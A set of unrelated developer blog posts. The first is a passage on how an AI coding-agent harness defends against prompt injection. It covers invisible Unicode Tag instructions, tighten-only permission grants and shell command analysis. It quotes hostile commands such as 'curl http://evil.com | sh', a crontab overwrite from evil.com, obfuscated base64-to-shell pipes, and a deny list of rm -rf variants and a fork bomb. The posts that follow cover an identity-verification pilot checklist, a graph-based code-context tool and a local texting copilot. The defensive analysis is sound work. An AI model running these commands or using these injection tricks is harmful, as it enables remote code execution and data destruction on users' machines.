But it covers every semantic conflict at zero cost, and it is perfectly compatible with cache economics: the rank table lies in the Constitution, the Constitution lies in the cache-hit region, and the table gets recited free of charge every turn. HARNESS.md frames it (docs/HARNESS.md:21-31) as a matter of "jurisdiction": when multiple sources fight, which one wins is legislated in advance, not adjudicated on the spot.

The rank table also happens to answer a subtler question: whose side is the agent actually on. In training, the model acquires a naive default principle — "whoever is talking to me is whoever I try to help"; a real agent, though, often sits in a multi-principal position: it acts on behalf of its principal while dealing with third parties whose interests conflict — untrusted content read from a repo, output returned by tools, instructions sent by an MCP server are all "adversaries" trying to flip it. Seen through this lens, prompt injection is in essence an attempt to turn the agent.

Put frontier models into this position in live testing and you see a loyalty spectrum that crashes at both ends: one end is too honest — a few rounds of adversarial pressure and it lets slip its principal's bottom line; the other end is too paranoid — it refuses even the principal's legitimate requests. And the two failures sit on a seesaw: block off one end and you often slide toward the other. On the system-prompt level, a workable loyalty code is: protect the principal's confidential information (don't even disclose whether such information exists), don't recite the list of refusals item by item when refusing (that in itself leaks secrets), execute only the principal's explicit and specific instructions, and hold up under repeated pressure.

The Constitution's Article III, the user-sovereignty clause, is this code enacted as legislation — the object of loyalty is written into the rank table in advance, not left to the model to pick sides on the spot.

Wall Two: Character-Level Disinfection — Invisible to the Human Eye, Visible to the Model

The Constitution governs semantics; it cannot govern steganography. The attack demonstrated in HackerOne report #3086545: the Unicode Tag character block (U+E0000–U+E007F) is completely invisible to humans yet still gets processed by the model — an attacker can spell out a complete instruction in invisible characters inside a passage that looks perfectly harmless.

The sanitization.rs module header (crates/agent-runtime/src/sanitization.rs:1-11) names exactly this as the thing it defends against, and notes that it mirrors Claude Code's same-named implementation.

The algorithm is deterministic (sanitization.rs:36-89): iterate to a fixed point, each round first NFKC-normalizing, then stripping dangerous characters. The dangerous-character verdict is belt and suspenders: Unicode categories Cf (format) / Co (private use) / Cn (unassigned) are wiped out entirely, plus an explicit-range fallback — zero-width characters, bidi controls, BOM, the private-use area, the Tag block; not one slips through.

The iteration cap is 10; past the cap it warns rather than panics, and the comment's justification is a fine principle: "never panics on untrusted input" — untrusted input has no standing to crash the process. The recursive version sanitizes even JSON keys, with a comment noting "a Unicode-polluted key name is just as dangerous as a polluted value".

Deployment sits at two chokepoints: the entrance, where the arguments of MCP tool calls are cleaned wholesale before forwarding (crates/agent-runtime/src/mcp.rs:3150-3158; the comment says outright that this sits at the throat, covering both the subsequent forwarding and the pseudo-tool reads); the exit, where all tool output passes through once before entering model context and the transcript (engine/context.rs:301-312).

Before read_file results enter compression and then the re-injection queue, they too travel in sanitized form — the comment stresses that this is a safety property the raw-content path would have lost.

The honest boundary: messages typed directly by the user do not pass through this disinfectant. Those two call sites above are the only production ones in the entire repo. This is a trade-off, not an oversight — what the user sees is the keys they typed, and silently rewriting the user's own input buys less safety than the trust it costs.

Wall Three: The Permission Ratchet — a One-Way Valve That Only Tightens

After the first two walls fail, what injected instructions want the model to do amounts to privilege escalation and destruction. This layer assumes the model has already been fooled; code alone stands guard.

Beyond the three approval tiers (Article 16 covered deriving them from capabilities), what's genuinely elegant is that every data flow across a trust boundary is fitted with a one-way valve: tighten only, never loosen. Three specimens.

Repo-local config ($WORKSPACE/.codesmith/config.toml) is defined in plain text as untrusted input (crates/config/src/lib.rs:683-694):

Repo-local config is untrusted input. This helper intentionally ignores credentials, endpoints, provider selection, auth/session values, telemetry, network policy, skill registry, LSP command tables, the [edit] parse gate, snapshots, and unknown extras. Approval and sandbox values may only tighten the existing user/global posture.

"May only tighten" is implemented with a rank (config/src/lib.rs:1844-1865): auto=0 < suggest=1 < never=2, and a project config may only propose a bigger number. Clone a malicious repo and it doesn't even have standing to propose "turn approvals off".

The approval system's "remember" used to live for only one session — an in-process HashSet, forgotten on exit, every new session having to go knocking again for the same cargo build. 3c0b4521 upgraded it into cross-session persistent grants: the approval modal gained an "always allow" tier (the P key), persisted to ~/.codesmith/approvals.toml — keyed by canonical workspace path, written securely with 0o600, and a corrupted file degrades to empty storage (never let one bad file block a session).

Where the grants land is itself a defense: grants live in the user's home directory, keyed by project path, so there is not an inch of soil in the repo workspace that can authorize itself — the same geometry as the trust table, and the same wall we copied back from ZCode in the comparison piece.

Two guardrails fend off loosened-match abuse: the grant key reuses the session's arity-aware grouping key, so the cross-session and single-session grant boundaries coincide; and dangerous commands (DANGEROUS_PATTERNS hits, SafetyLevel::Dangerous) never show the "always allow" tier in the UI at all — rm -rf / forever offers exactly three choices, "this time / this session / deny," so a persistent grant has nowhere physical to be written. That same night, the re-review in 9685cbf6 welded three more layers onto this door.

Eligibility tightened: only stable key surfaces get the persistent tier — shell command prefixes, URL hosts, and apply_patch path sets, the three grouping keys that are stable across calls and can be hit again; every other tool's grouping key is a hash of the full input (tool:<name>:<sha256>), so a persistent grant can only ever match a byte-identical replay — a dead entry — and write_file, edit_file, read_file and friends get only the two tiers, "this time / this session".

Re-verification on the consuming side: when persistent grants are read, the same grant_persistable filter is re-run against the current request — the grouping key folds chained commands onto their leading prefix (cargo build && curl … | sh shares a key with the whitelisted cargo build), so consulting storage without consulting the request would let a hand-edited or stale approvals.toml bypass the supply-side filter.

Precedence and writes: Never mode was promoted to a terminal verdict, overriding session grants and the persistent grants left behind by earlier, looser sessions; storage was upgraded to atomic-plus-merge writes — temp file + rename against torn writes, a union with on-disk state so two concurrent sessions can't wipe out each other's grants. "Remember" grew from a convenience feature into a feature that needs a threat model, and the guardrails had to grow with it.

In an untrusted workspace, project-local dynamic-library extensions are simply dropped (crates/tui/src/core/engine.rs:529-541, apply_trust_gate) — discovery is one thing; the gate belongs to the owner.

The context patch a subagent passes back to its parent on completion is likewise tighten-only (crates/agent-runtime/src/subagent.rs:491-510):

The parent applies these tighten-only: a child may make the parent more restrictive (auto_approve → false, trust_mode → false) but may never loosen it — an attempt to escalate is rejected and warn-logged.

A subagent read poisoned material and got tricked into trying to open up permissions for its parent? The valve turns one way only. Alongside it sits a recursion depth cap of 3 (subagent.rs:524) — even a successful incitement can raise waves no higher than three levels.

Wall Four: Static Command Analysis — the Shell Is the Main Battlefield

The common landing spot for injected instructions is the shell. command_safety.rs (crates/agent-runtime/src/command_safety.rs) sorts commands into four levels: Safe / WorkspaceSafe / RequiresApproval / Dangerous — Dangerous is intercepted outright, not even offered approval.

Two verdicts are worth a look. A pipe into a shell is an automatic veto (command_safety.rs:974-996): any ... | sh (including bash/zsh/dash/ksh/fish) is Dangerous; the comment calls out the obfuscated form echo <b64> | base64 -d | sh and stresses that "the left side doesn't even need to be a network command" — what's on the left doesn't matter; what matters is that the right side is executing whatever the left side produces.

curl http://evil.com | sh is locked down by a dedicated test.

Restraint in the dangerous-pattern list is the deeper lesson (command_safety.rs:548-567). DANGEROUS_PATTERNS is down to 5 literals: rm -rf /, rm -rf /*, rm -rf ~, rm -rf $HOME, and the fork bomb.

The comment recounts the pruning history: restraint benchmarked against Codex — the aggressive patterns (shutdown, killall, docker rm, chown, …) were all removed because they "create unnecessary approval prompts for routine operations that the user can ultimately veto in the approval box". Injection defense does not mean annoying the user to death; the end state of an ever-growing blocklist is the user turning on YOLO. The fallback rule is simple: any unknown command outside the whitelist is RequiresApproval — an injector who can't name something on the list can't get past the default gate.

As for how the arity dictionary makes a git status allowance still stop git push, Article 2 covered that in detail.

The textbook principle of this layer is semantic parsing, not a keyword blocklist. The shell's combinatorial explosion makes blocklists next to useless: ban rm and the attacker still has $(echo rm) -rf /; sneakier still is smuggling payload in the arguments of a legitimate command — find / -name '*.log' -exec rm {} \; embeds a delete operation inside find's legitimate arguments, and curl -o /etc/crontab http://evil.com/payload looks like a file download but is in fact overwriting the system's scheduled tasks.

A blocklist matches strings; semantic parsing understands the command: which flags consume the next argument, whom the right side of the pipe is executing, which file a redirection lands in. CodeSmith's arity dictionary rules on the "action" rather than the string prefix (Article 13), and "a pipe into a shell is an automatic veto" rules on "who is executing whom" — both rules work at the semantic level, which is exactly why five literals suffice to hold the position. Compound commands get the same semantic adjudication: allow rules split the command on &&/;/| and match segment by segment — if the segment counts don't line up or any single segment misses, there is no passage — so cargo * can authorize cargo build && cargo test but can never authorize cargo build && curl evil.sh; deny rules, inversely, take "the most dangerous segment," so cd /tmp && rm -rf / cannot escape the rm -rf / rule (segment splitting and matching on both sides, from execpolicy/matcher.rs:157 on).

Wall Five: The Network Boundary — the Gate on Exfiltration

Injection's second objective is getting the data out. Article 17 just walked through this layer's fortifications — the deny-wins tri-state policy, the SSRF-restricted IP table, DNS pinning against rebinding, per-hop re-checks on redirects — and collapsed into the injection view it comes down to one sentence: every route data can take out (fetch_url, the web_search backend, MCP's HTTP transport) passes the same policy table, and approval is the default. Add the Bearer redaction on web_search's error echoes, and the API key finds even the "slip out inside an error message" route blocked.

The textbook selection and CodeSmith's coordinates: sandbox engineering's three-piece kit is network egress control (offline by default; a whitelist proxy admits a limited set of destinations on demand — package-manager sources, documentation sites, APIs the task explicitly needs), filesystem isolation (credential files are not mounted into the sandbox at all — ~/.ssh, keys, and tokens never leave the palace), and resource limits (CPU/memory/disk/timeouts, against fork bombs and infinite disk writes).

A timeout should return a structured error — "terminated after exceeding 120 seconds, final output below" — rather than a silent kill, so the agent gets a chance to correct course next turn. CodeSmith's difference lies in the foundation: an OS-level sandbox (Seatbelt, Linux bwrap) plus an application-layer tri-state policy, with the network going through "approval via Prompt by default" rather than an egress proxy — two solutions to the same problem, one standing guard at the transport layer, one at the decision layer. Landlock, however, is a name that overpromises: it was never actually wired up, and the security-debt settlement honestly marks it as "no isolation," preferring to refuse sandboxed execution rather than misreport — on Linux, the isolation that actually takes effect is bwrap (the first note in Article 20).

Wall Six: Output-Side Anti-Forgery — Only the Protocol Channel Counts

The crowning achievement of an injection attack is making the model believe in a tool call that "already happened" — the five fake wrappers of Article 1. The line of defense is a three-piece kit: the streaming scrubber strips them on the spot and informs the user via FAKE_WRAPPER_NOTICE (engine/streaming.rs:59-86); and the onetime text parser has formally retired, its module header saying of itself, "the engine no longer invokes this parser".

The regression tests in protocol_recovery.rs lock the hostility into the contract — "protocol drift in the model output should be visible, not silently turned into tool execution". Article 16 located this line: a slip inside the protocol can be repaired; a forgery outside the protocol must be stripped — because tolerating forgery amounts to opening an execution channel on the injector's behalf.

The Honest Inventory

The "don't haves" this installment has to own up to:

  • The unified delimiter is a recent patch. When this installment was first drafted, this slot recorded a gap: CodeSmith did not wrap webpage bodies or tool output inside a "this is data, not instruction" fence — the whole bet was riding on rank. ab7f093b filled that gap — the <external_content> delimiter plus the Constitution's Tier 6 clause (see Wall One). What's interesting is the way it caught up: byte-stable labels (the prefix cache unharmed), only newly pushed results wrapped (append-only unbroken), local tools unwrapped (the label itself is also a context cost). Even defensive infrastructure has to pass the cache-economics checkpoint — the Article 9 discipline echoing on the security side. Compared with Claude Code's fence-everything approach, the coverage is deliberately narrower: only network origins get wrapped, not local files — the local threat model is different.
  • No LLM-based injection detector — no second model scanning the context for malicious instructions.
  • User input is not sanitized (the trade-off above).
  • The fallback is rollback: Article 7's side-git snapshots. All six walls breached, damage already done — /restore N returns you precisely to any turn boundary. The end state of defense is admitting that defense can fail.

How seriously the threat modeling is taken is, by contrast, on the record: SECURITY.md's bounty scope lists in plain text "Remote code execution through crafted prompts or model responses". The team is putting a bounty on this as a real vulnerability class, not a theoretical toy.

Coda: Context Engineering Is the Engineering of Distrust

The context thread gathers here to a close — eight installments in all. Article 8 tamed volume — big outputs became handles, pages fetched on demand; Article 9 defended the prefix — a conversation history that never gets rewritten; Article 10 managed the tail — the dashboard hung at the end; Article 11 handled the full window — six layers of defense plus one act of lawbreaking that got booked; Article 16 unified the tools — fifty weapons, one slot; Article 17 laid down house rules — the manual teaches, the errors correct, the engine intercepts; Article 18 guarded the write — close the syntax gate before writing to disk; and this installment surrounded the entrances — six layers of depth from the Constitution, the disinfectant, and the approval gates.

Strung together, these installments are really one thing: as Article 1 put it, a good harness is, in essence, a clearly written catalog of distrust. The earlier installments wrote distrust of the model's output, judgment, code, and cleanup; this stretch of the series paved distrust across every entrance and exit of the context — history must never be rewritten, state is append-only, compression keeps books, tools declare their capabilities at the door, the manual teaches manners first, and foreign text starts a head shorter. Context engineering, in the end, is the engineering of distrust: not guessing whether the model will do evil, but making sure that whatever layer evil happens on, a wall is waiting for it.

title: What should you accept before enabling a verification pilot?
description:
A small B2B team has a working synthetic identity onboarding run and wants to request a real hosted identity pilot. The decision is not whether the fixture passes, but what evidence you should demand before anyone treats a pilot result as permission to act on a real user. This article proposes a synthetic-to-approved-pilot acceptance checklist. It shows the exact fixture outputs to verify and names the evidence that is still missing. The checklist is a proposed application design, not implemented GridZen behavior. It does not grant production access.

The problem: a green fixture is not a pilot

The tempting shortcut is to run the synthetic example, see status approved, and request a pilot as if the integration were proven. The fixture only accepts synthetic callbacks: event IDs must start with fixture-, the source must be fixture_callback, and the mode must be synthetic_fixture. Any other mode or source raises PRODUCTION_SIGNATURE_VERIFIER_NOT_IMPLEMENTED. It has no real signature verifier. Its recover step expires a session locally and never polls a provider. A permission granted in the fixture is a local record; every output reports live_permission_changed false. So the question for the reader is: which caller-owned behaviors have you tested, and which still need real evidence?

Worked hypothetical scenario and expected outputs

Hypothetically, a team onboarding sellers runs the four-branch downloadable example locally. This is separate from the anonymous three-scenario HTTP trial. Creating the session should return mode synthetic_fixture, state simulated, session fixture-session, link_executable false and next send_real_provider_link_only_after_authorization. A fixture-approved event with policy true should return status approved, deadline 60, permission_granted true and grant_count 1. Replaying the same event should return an identical record with grant_count still 1. A later Declined correction should return status declined with permission_granted false and grant_count 1. In a separate run where the session stays pending past the deadline, recover should return status expired, permission_granted false, grant_count 0, next review_or_authorized_provider_refresh and provider_polled false. An event for an unknown session should raise BINDING_MISMATCH, and a read of an unknown session should raise SESSION_NOT_FOUND.

Failure handling your application must own

Proposed design: treat unknown, review and expired as non-grant states that route to human review or an authorized provider refresh. Never treat them as silent approvals or rejections. Bind every event to tenant and subject. Deduplicate by session and event before granting anything. Make a correction to Declined revoke the local grant. After an interruption, read the existing record rather than creating a new session, and use one idempotency UUID per request. If a phone check is part of signup, the fixture's unknown and provider_failure branches return valid null. Route them to review_or_existing_otp or bounded_retry_then_review; neither sends an OTP.

What GridZen has actually validated

According to the guide, a real basic phone check succeeded through the deployed API and MCP. A previously approved operator identity session was refreshed and read through the customer interfaces. For hosted identity, real creation, signed notifications, authoritative reads and expiry are evidenced. Still unvalidated: human completion of a new session, the real final webhook for a newly Approved user, and an end-to-end customer business action. Operator tests are not customer demand. Approved is never unconditional permission; your rules decide.

Pilot terms to check, not assume

A verified merchant account may submit a pilot application. The owner reviews purpose, downstream agreements, supplier rights, capabilities, free allowance and expiry. Applications never enable production automatically. The current hosted identity trial for eligible US/GB businesses is bounded: 2 requests per verified business domain and 10 shared lifetime requests, with separate Didit addendum acceptance. It covers confirmed free modules only, and customer payments are disabled. Bank-account matching, KYB and automatic business approval are not available. Free allowances do not grant resale rights or guarantee future terms.

Practical acceptance checklist

Before applying, confirm each item. 1) All seven fixture outputs above match exactly, including the two error codes. 2) Your handler refuses grants without explicit policy and an account binding. 3) Duplicate events do not increment grant_count. 4) Declined revokes access. 5) Expired, unknown and review states reach a review queue. 6) Recovery reads existing records and never creates duplicate sessions. 7) You have read the capabilities and documented your purpose and downstream agreements. 8) You have recorded the missing evidence: a real signed final webhook, a newly Approved user and a live business action. Verify these during the bounded pilot before relying on them. Your next step is to run the synthetic example and inspect your failure handling. Request a saved sandbox only if the task fits.

Run the checked synthetic example

Download and extract https://gridzen.ai/downloads/verification-delivery.zip, enter verification_delivery, then run with Python 3.10+. This local example makes no network calls. Use a fresh database for an independent identity run.

python3 delivery.py identity --db /tmp/gridzen-article-fixture.sqlite

Sources and scope

https://gridzen.ai/guides/customer-pilot/
https://gridzen.ai/guides/current-capabilities/
Based on the checked source snapshot and local fixture; proposed application rules are design advice, not proven production behavior. Written with AI assistance and reviewed independently.

curl https://gridzen.ai/console/api/quickstart/trial \
  -H 'Content-Type: application/json' \
  -d '{"task": "identity_onboarding", "scenario": "success"}'

This is synthetic integration testing, not identity verification or production authorization. Real payments are disabled.

Create a free sandbox account · Integration guide

Written and tested by the GridZen team with AI assistance.

title: How a failed SaaS pricing calculator, A Gemini quota meltdown, and FalkorDB led us to build Banana.
description:
Peel Back the Chaos: Smarter AI Coding with Banana

Disclaimer: I genuinely wanted to ask GPT to write this entire blog, slam my laptop shut, and enjoy some uninterrupted sleep. But staring at graph queries and an exhausted Gemini quota right in the middle of testing, I figured the internet deserved to know what happened. Also, the best blog post wins Apple AirPods 5. I'm not above risking my dignity for noise cancellation. 🎧

Why We Built Banana

Banana started as a B2B SaaS pricing calculator. Don't ask me about the name. it's just random. After hours of wrestling with Streamlit and discount sliders, I asked myself:

Would I ever voluntarily use this product?

The answer was no.

Meanwhile, AI coding agents were making the same mistakes over and over: forgetting architectural decisions, breaking dependency boundaries, and consuming huge amounts of context just to understand a codebase.

So I nuked the UI and pivoted.

git rm -rf ui/ components/ deal_calculator.py
git commit -m "pivot: delete pricing sliders, embrace the void"

Meet Banana: a graph-powered memory and context engine for coding agents. It helps tools like Claude Code and Cursor retrieve code relationships, remember architectural decisions, and check explicit rules through MCP.

The FalkorDB Skepticism: "Wait, Is This Just Redis with a Mustache?"

When I first seen FalkorDB, I’ll be completely honest: I thought it was some cheap knockoff of Redis and Neo4j.

"Oh great, another database. Is this just RedisGraph repackaged with a shiny logo, or Neo4j that demands 4GB of RAM just to clear its throat?"

I expected a clunky wrapper over key-value pairs that would fall apart the moment we asked for multi-hop AST dependency traversals.

Then, I actually sat down and dug into the documentation.

It turns out FalkorDB isn't a knockoff. Under the hood, it’s powered by GraphBLAS—which means it represents nodes and relationships as sparse linear algebra matrices implemented in optimized C.

When you ask Cypher for a 3-hop dependency traversal, it's not doing slow, recursive pointer-chasing in memory like traditional graph engines. It's executing sparse matrix multiplication.

Our measured queries on FalkorDB Cloud:

  • 3-Hop Multi-Edge Traversal: 17.4 ms
  • Architectural Decision Recall: 1.37 ms
  • AST Boundary Check: 0.28 ms

It was answering queries faster than Python could even serialize the response JSON. That was the moment I realized: this isn't marketing fluff—it's solving a genuine systems engineering problem for low-latency agent loops.

When Gemini Left the Chat (The Quota Meltdown)

Our Gemini API quota ran out right in the middle of testing.

Instead of feeding the model dozens of source files for every question, we'd already indexed our codebase into FalkorDB:

  • 39 files
  • 42 classes
  • 84 functions
  • 275 import and call relationships

That changed everything. Banana could query the graph directly to retrieve dependencies, inspect code structure, and recall stored decisions without spending LLM tokens on those operations.

The graph became our memory—and our fallback when the model wasn't available.

How FalkorDB & Edmonds-Karp Actually Solve Context Bloat

Here is the step-by-step flow of how FalkorDB turns codebase chaos into deterministic context:

Step 1: Indexing Structure, Not Just Text

Instead of dumping raw strings into a vector database and hoping for the best, FalkorDB indexes our repository as an Abstract Syntax Tree (AST) graph (:File, :Class, :Function, connected by IMPORTS and CALLS). Cypher queries traverse these relationships as sparse matrix multiplications.

Step 2: The Liquid & The Pipes (Edmonds-Karp Max-Flow)

"Edmonds-Karp is a famous computer science algorithm that calculates the maximum amount of liquid you can push through a network of pipes before hitting a bottleneck."

In Banana, our "liquid" is code tokens, and our "pipes" are dependency relationships:

  1. The Source: The specific file or function you're editing.
  2. The Pipe Network: Every class, helper, and imported module connected to it, where each pipe's capacity is weighted by PageRank and architectural relevance.
  3. The Bottleneck (Sink): Your strict LLM context budget (e.g., 950 or 2,000 tokens).

Edmonds-Karp runs breadth-first search (BFS) to find augmenting paths through the dependency graph, pumping the maximum volume of critical architectural context through the pipes until the budget bottleneck is reached.

Result? You get complete, unbroken interfaces and immediate dependencies without overflowing your token limit or slicing code mid-function.

The goal: give the agent what it needs, not everything you have.

Ephemeral Graphs: A Scratchpad That Won't Trash Production

When an agent wants to reason through speculative changes—like testing a hypothetical refactor, simulating a breaking dependency, or asking "what if I change this interface?"—you never want it writing directly to your persistent codebase graph.

Because FalkorDB is built on in-memory GraphBLAS linear algebra, creating and tearing down graphs takes milliseconds, not minutes.

Banana takes full advantage of this with Ephemeral Scratchpad Graphs:

  • Whenever an agent enters speculative simulation mode, Banana spins up an isolated micro-graph (banana_scratch_<session_id>) in under 5 milliseconds.
  • The agent simulates AST diffs, tests scenario policies, and checks cyclic dependencies in complete isolation.
  • Once the simulation concludes, the scratchpad is dropped with a single command.

Zero disk clutter, zero persistent memory corruption, and zero risk of hallucinated agent thoughts polluting your source of truth.

Guardrails Without an LLM Call

Suppose an agent tries to import a low-level database driver directly into a UI component.

If that dependency violates an explicit architectural rule, Banana can check the relevant graph relationships and flag the violation without asking an LLM to review it.

We also built deterministic checks for patterns such as hardcoded credentials and unsafe code primitives.

Our measured latency for the tested AST security and boundary check was 0.28 ms.

Not every security problem can be caught with a simple rule, but explicit constraints shouldn't need an LLM call every time.

The Architecture

Banana connects coding agents to an MCP server that exposes tools for code indexing, context assembly, guardrails, and persistent memory.

Behind the scenes, FalkorDB manages three graph layers:

  • banana_knowledge — code structure, dependencies, and architectural decisions.
  • banana_demand — architectural rules, invariants, and constraints.
  • banana_scratch_* — ephemeral micro-graphs for isolated reasoning and policy simulations.

We deployed the service on AWS Lambda, backed by FalkorDB Cloud.

What We Learned

  1. Code is a graph, not just text. Imports, calls, and class relationships matter when retrieving context.
  2. Not every problem needs an LLM. Deterministic checks can enforce explicit rules faster and more predictably.
  3. Memory matters only when it's retrieved. Saving decisions is useful; bringing them back at the right time is what makes them valuable.
  4. Ephemeral graphs unlock safe agent speculation. Giving agents an instant, disposable graph sandbox prevents real-world codebase pollution.

The Final Summoning 🍌

Whenever the coding agent encounters another architectural disaster, circular import, or hallucinated token overflow...

The wheel has spun. The graph adapts. The code survives. Now give me my like. 🎧

Built with: FalkorDB, AWS Lambda, Python, and an alarming quantity of water.

GitHub: https://github.com/Viswesh934/Banana

Live endpoint: https://ssrr3wg2ibyqkh6gph4ehlthay0ovdzp.lambda-url.ap-south-1.on.aws/

Demo: https://youtu.be/OXrqt5gLIxQ

title: Is "没事" really fine? A private texting copilot that runs on your own laptop
description:
This is a submission for the Hacktoberfest Open-Source AI Challenge Week 2: Side Hustle

Team: @lydiazhang135, @shiyi_jiang_92dc7754aa4d9 and me.

Your partner sends two characters: 没事, "it's nothing." You have typed and deleted three replies. Is it really nothing? Do they want an apology, an explanation, or some space? And whatever you send next, do you want a cloud service to read the whole conversation first?

TL;DR

  • Paste your partner's message. A 322M model, Laya, reads the subtext in under half a second, and Gemma 4 E2B writes two replies; on a laptop CPU the first is done in about 3.6 s. You edit one and send it yourself.
  • Both models run on your own machine: by default nothing you paste leaves it, and with no per-message cost the app can sell for a one-time US$14.99 (¥68 in China), where the main cloud apps like it charge US$29.99–79.99 a year.
  • Fine-tuning the judge for about US$3 lifted its macro-F1 from 0.33 to 0.57 and its safety recall from 0% to 62% (the bar I set before training is 90%). The fine-tuned Gemma won 133 and lost 67 of 297 blind comparisons with stock Gemma (the rest tied). The app has used both since 18 October; a final, held-back exam comes next.
  • Try it in your browser (stand-in models, sample data), and recompute the evaluation numbers below with one command: npm run reproduce.

What I Built

Laya-Heart is a copilot for couples' chats. It runs as a web page on your own computer.

  1. Copy what your partner said, switch to the page and press Ctrl+V.
  2. Within a second, a small Laya card appears under their message: one to three short questions about it, with probabilities (Does "没事" really mean it's fine? What do they need now?), or a danger level from 1 to 10.
  3. Gemma 4 E2B starts writing two replies straight away. On a laptop CPU, the first is complete in about 3.6 s.
  4. Pick one, edit it, press Enter to copy it, and paste it into your chat app yourself.

Laya-Heart connects to no chat app and never sends a message for you. With the default settings, nothing you paste leaves your machine.

Each person you talk to gets a profile: their chat, saved on your PC, and a short "book" you write about them (nicknames, sore points, the day you met). When a new message touches on something in the book, Gemma gets the matching sentences. The app also saves facts from the chat on its own, in the chat's own words, with undo, and pins down relative dates: 下周六（10-24）是我生日, "next Saturday (Oct 24) is my birthday."

Safety rules are written in code, not left to a model. After every card, Laya answers one more, hidden question about safety, and the code also checks the chat for keywords. Signs of self-harm, or of abuse and control, bring up a notice; for self-harm, the reply options also include one written by a person, not by Gemma. If the chat looks like it involves a minor, nothing is drafted until you confirm that you are both adults. On the 300-chat practice exam described below, the notice came up on 13 of the 21 risky chats (the keyword rules alone caught 4) and on 1.8% of ordinary chats.

Who would pay for it? People who freeze over a text from someone they care about: new couples, long-distance couples, anxious texters. What I'd sell them is what a chatbot tab doesn't give: privacy (the chat stays on the PC), speed (one paste, replies in seconds, with the history and profile already there), and no subscription.

How many, and for how much? From public census and survey data, about 39–51 million Americans aged 20–34 have a partner and a smartphone, and 17–27 million of them can use a Windows PC. For China, the same estimate gives 138–162 million and 41–94 million. The main apps in this space (RIZZ, WingAI, YourMove and others) sell subscriptions: US$29.99–79.99 a year on the US App Store. I'd charge once: US$14.99, or ¥68 in China, for the ready-to-run app and its updates, while the code stays MIT. The market-size note has the sources and the arithmetic.

Making a 2B model feel instant on a laptop CPU

On a laptop CPU, Gemma 4 E2B reads a prompt at about 55 tokens/s and writes about 12 tokens/s, so reading was most of the wait. At first I ran Gemma through Ollama's chat API, which reuses Gemma 4's sliding-window cache only when the prompt is exactly the same. So every new message meant re-reading the whole 400–475-token prompt: 6.4–9.4 s. Three changes removed most of that wait:

  • I start llama.cpp's llama-server myself with --swa-full, so it keeps everything it has already read.
  • The prompt is laid out for the cache: fixed rules first, then the chat, which only grows at the end, then a short tail that turns Laya's answers into instructions. A new message now costs 62–105 new tokens instead of 400+.
  • Replies start the moment the card is done, stream as they are written, and stop after two.

On my laptop (Intel i5-13420H, 16 GB of RAM, no discrete GPU), two five-turn runs with the fine-tuned models, traced in Sentry, gave median times of 0.44 s to the whole card, 3.6 s to the first complete reply and 5.8 s to both replies. That was on a busy machine with about 3 GB free; earlier runs with the stock models on an idle machine took 0.39 s, 3.5 s and 5.0 s, using about 2.3 GB of RAM for both models.

Getting started is meant to be boring: download the ZIP and double-click start.bat (macOS: start.command; Linux: ./start.sh). On the first start, one button downloads about 4.8 GB, resuming if it stops and checking each file against a pinned SHA-256. I have tested it on Windows 11.

Fine-tuning the judge (Laya)

Out of the box, Laya is a general-purpose judge that hasn't been tuned for couples' chats. So I built a training kit and ran it end to end:

  • Teacher A (DeepSeek-V4.1-Flash) writes 3,000 practice chats to fit chosen answers, then reads each one five times per question without seeing the intended answers; any intended answer the readings don't match is thrown out.
  • Teacher B (Qwen3, a different model family) writes and labels a separate 300-chat practice exam, so the model is never graded by the teacher that taught it.
  • Training runs on Kaggle's free T4 GPUs: three seeds in about an hour, keeping the best on the practice exam. The gates were set before training, among them: macro-F1 up by at least 0.20, no question worse by more than 0.02, and safety recall of at least 90% at the app's 0.8 alarm line.
On the 300-chat practice exam (teacher B: Qwen3-32B) Zero-shot Laya Fine-tuned (v3)
Judgment, macro-F1 over 11 questions 0.33 0.57
Calibration error (ECE) 0.15 0.07
Danger level, mean absolute error (1–10) 2.78 1.56
Safety recall at the 0.8 alarm line 0 of 21 13 of 21 (62%)
False alarms on ordinary chats 2.9% 1.4%

The 95% confidence interval for the F1 gain is 0.18 to 0.31. These are practice-exam numbers; a final, held-back exam comes next. Every question, gate and caveat is in the fine-tuning report.

Two of the gates are still ahead. Safety recall is 62%, against a bar of 90%: five of the eight risky chats it missed were abuse or control read as no risk, such as "You won't see your sister again unless it's through me." And F1 on "is the crisis over?" dipped by 0.08, against a limit of 0.02, on chats where even the teacher split its votes. Still, v3 raises the app's safety notice on 13 of the 21 risky chats instead of 4, so the app has run v3 since 18 October, and the held-back exam decides whether it stays.

The whole run cost about ¥23 (roughly US$3) in DeepSeek API calls and about 9 of Kaggle's 30 free weekly GPU hours. Running the kit end to end also turned up 41 issues in the code and the manuals, including a cache bug that had silently made 20% of the practice chats near-duplicates, fixed before the final training runs.

I trained three versions, v1 to v3, each with a different mix of practice data. What I learned:

  • Compare averages, not the best seed. Seeds of the same version differed by 0.02–0.05 in F1; averaged over their three seeds (leaving out the safety question), v1, v2 and v3 scored 0.57, 0.56 and 0.56.
  • Extra risky chats leak into other answers. Raising their share from 10% to 25% (v2) lifted recall on a separate safety check from 53% to 68%, but the model began calling more chats emergencies and missing a partner who is simply angry. In v3 they train only the safety question: recall on the check (47 fresh risky chats, 19 ordinary) reached 79% with no false alarms, and the side effects mostly went away.
  • You can't measure what your exam teacher can't write. Asked for 25 risky exam chats, Qwen3-14B put a clear signal in only 5; a stricter prompt and the bigger Qwen3-32B got the exam to 21.

Fine-tuning the writer (Gemma)

I also fine-tuned Gemma with the kit's Gemma manual. The app now downloads the fourth of four runs, chosen by a rule written before the results:

  • Data: 1,496 examples. In Chinese, teacher A wrote candidate reply sets to the app's exact prompt, the app's rules dropped bad sets, and the best-scored set became the training reply; the 108 English replies are stock Gemma's own drafts, filtered and scored the same way, so they stay within the app's 60 characters.
  • Training: a 47-minute Kaggle job on a T4 trained a LoRA (rank 16, two epochs) with Unsloth and exported a 3.4 GB Q4_K_M GGUF for the same llama-server.
  • Result: on all 297 practice-exam chats, teacher B (Qwen3-32B) compared it with stock Gemma blind, in both orders: 133 wins, 67 losses, 97 ties (61% with ties counting half; 65% on Chinese chats). It made things up or overpromised once; stock Gemma did 16 times.
  • Still open: on the kit's 50-chat self-check, every gate passes but one: the win rate came in at 0.54 against a bar of 0.55 (a second judging of the same 50 chats gave 0.57).

Dry-running the tester kit with an AI agent

